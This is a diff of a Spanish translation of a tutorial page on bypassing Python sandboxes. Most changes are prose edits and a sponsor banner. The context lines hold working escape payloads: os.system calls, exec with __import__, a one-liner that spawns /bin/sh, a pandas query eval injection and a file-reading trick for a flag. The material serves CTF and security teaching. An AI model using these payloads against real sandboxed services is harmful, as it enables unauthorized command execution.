@@ -17,9 +17,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Get a hacker's perspective on your web apps, network, and cloud
+**Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube**
 
-**Encuentra e informa sobre vulnerabilidades críticas y explotables con un impacto real en el negocio.** Usa nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.
+**Encuentra e informa sobre vulnerabilidades críticas y explotables con un impacto real en el negocio.** Utiliza nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.
 
 {% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}
 
@@ -27,9 +27,9 @@ Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="
 
 Estos son algunos trucos para eludir las protecciones de sandbox de Python y ejecutar comandos arbitrarios.
 
-## Command Execution Libraries
+## Bibliotecas de Ejecución de Comandos
 
-Lo primero que necesitas saber es si puedes ejecutar código directamente con alguna biblioteca ya importada, o si podrías importar cualquiera de estas bibliotecas:
+Lo primero que necesitas saber es si puedes ejecutar código directamente con alguna biblioteca ya importada, o si podrías importar alguna de estas bibliotecas:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -116,7 +116,7 @@ Este paquete se llama `Reverse`. Sin embargo, fue diseñado especialmente para q
 Ten en cuenta que exec permite cadenas de varias líneas y ";", pero eval no (ver operador walrus)
 {% endhint %}
 
-Si ciertos caracteres están prohibidos, puedes usar la **representación hex/octal/B64** para **bypassear** la restricción:
+Si ciertos caracteres están prohibidos, puedes usar la representación **hex/octal/B64** para **bypassear** la restricción:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -160,7 +160,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Bypass de protecciones a través de codificaciones (UTF-7)
+## Bypassing protections through encodings (UTF-7)
 
 En [**este informe**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) se utiliza UFT-7 para cargar y ejecutar código python arbitrario dentro de una aparente sandbox:
 ```python
@@ -318,7 +318,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Leer archivo con ayuda de builtins y licencia
+### Leer archivo con ayuda y licencia de builtins
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -508,7 +508,7 @@ Podemos hacer lo mismo con **otras bibliotecas** que sabemos que se pueden usar 
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Además, incluso podríamos buscar qué módulos están cargando bibliotecas maliciosas:
+Además, podríamos incluso buscar qué módulos están cargando bibliotecas maliciosas:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -686,7 +686,7 @@ Puedes verificar la salida de este script en esta página:
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
 {% endcontent-ref %}
 
-## Formato de Cadena en Python
+## Formato de cadena de Python
 
 Si **envías** una **cadena** a python que va a ser **formateada**, puedes usar `{}` para acceder a **información interna de python.** Puedes usar los ejemplos anteriores para acceder a globals o builtins, por ejemplo.
 ```python
@@ -758,7 +758,7 @@ str(x) # Out: clueless
 
 Según el [**desafío TypeMonkey de este informe**](https://corgi.rip/posts/buckeye-writeups/), es posible cargar bibliotecas arbitrarias desde el disco abusando de la vulnerabilidad de cadena de formato en python.
 
-Como recordatorio, cada vez que se realiza una acción en python, se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
+Como recordatorio, cada vez que se realiza una acción en python se ejecuta alguna función. Por ejemplo, `2*3` ejecutará **`(2).mul(3)`** o **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
 
 Tienes más como esto en la sección [**Ejecución de Python sin llamadas**](./#python-execution-without-calls).
 
@@ -993,7 +993,7 @@ types.CodeType.__doc__
 ### Recreando una función filtrada
 
 {% hint style="warning" %}
-En el siguiente ejemplo, vamos a tomar todos los datos necesarios para recrear la función directamente del objeto de código de la función. En un **ejemplo real**, todos los **valores** para ejecutar la función **`code_type`** son lo que **necesitarás filtrar**.
+En el siguiente ejemplo, vamos a tomar todos los datos necesarios para recrear la función directamente del objeto de código de la función. En un **ejemplo real**, todos los **valores** para ejecutar la función **`code_type`** es lo que **necesitarás filtrar**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1010,7 +1010,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 En ejemplos anteriores al principio de esta publicación, puedes ver **cómo ejecutar cualquier código python usando la función `compile`**. Esto es interesante porque puedes **ejecutar scripts completos** con bucles y todo en una **línea** (y podríamos hacer lo mismo usando **`exec`**).\
 De todos modos, a veces podría ser útil **crear** un **objeto compilado** en una máquina local y ejecutarlo en la **máquina CTF** (por ejemplo, porque no tenemos la función `compiled` en el CTF).
 
-Por ejemplo, compilamos y ejecutamos manualmente una función que lee _./poc.py_:
+Por ejemplo, compilaremos y ejecutaremos manualmente una función que lee _./poc.py_:
 ```python
 #Locally
 def read():
@@ -1060,7 +1060,7 @@ Usando herramientas como [**https://www.decompiler.com/**](https://www.decompile
 ### Assert
 
 Python ejecutado con optimizaciones con el parámetro `-O` eliminará las declaraciones de aserción y cualquier código condicional en el valor de **debug**.\
-Por lo tanto, verificaciones como
+Por lo tanto, las verificaciones como
 ```python
 def check_permission(super_user):
 try:
@@ -1082,7 +1082,7 @@ will be bypassed
 
 <figure><img src="/.gitbook/assets/pentest-tools.svg" alt=""><figcaption></figcaption></figure>
 
-#### Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube
+**Obtén la perspectiva de un hacker sobre tus aplicaciones web, red y nube**
 
 **Encuentra e informa sobre vulnerabilidades críticas y explotables con un impacto real en el negocio.** Utiliza nuestras más de 20 herramientas personalizadas para mapear la superficie de ataque, encontrar problemas de seguridad que te permitan escalar privilegios y usar exploits automatizados para recopilar evidencia esencial, convirtiendo tu arduo trabajo en informes persuasivos.
 
